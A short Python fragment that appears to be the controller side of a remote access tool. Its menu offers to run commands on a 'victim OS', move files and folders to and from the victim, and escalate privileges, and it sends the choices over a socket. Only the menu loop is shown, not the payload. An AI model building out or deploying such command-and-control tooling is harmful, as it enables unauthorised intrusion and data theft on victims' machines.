
def show_options():
    print("\n")
    print("\t\t[ 01 ] Run Command on victim OS")
    print("\t\t[ 02 ] Upload File to victim ")
    print("\t\t[ 03 ] Download File from victim")
    print("\t\t[ 04 ] Download Folder to victim")
    print("\t\t[ 05 ] Escalate privilages")
    print("\t\t[ 99 ] Exit the program")
    print("\n")

def handleConnection(my_socket):
    print("[+] Handling Connection")
    keep_alive = True
    while keep_alive:
        show_options()
        user_option = input("[*] Enter the option you want to select : ")
        my_socket.send_data(user_option)
        if user_option == "1":
            print("\t\t[+] Executing System Commands on Remote PC")
        elif user_option == "2":
            print("\t\t[+] Uploading Files to Remote PC")
        elif user_option == "3":
            print("\t\t[+] Download Files from Remote PC")
        elif user_option == "4":
            print("\t\t[+] Download Folders from Remote PC")
        elif user_option == "99":
            keep_alive = False
            print("\t\t[-] Exiting the loop")
        else:
            print("\t\t[-] Invalid input, try again")
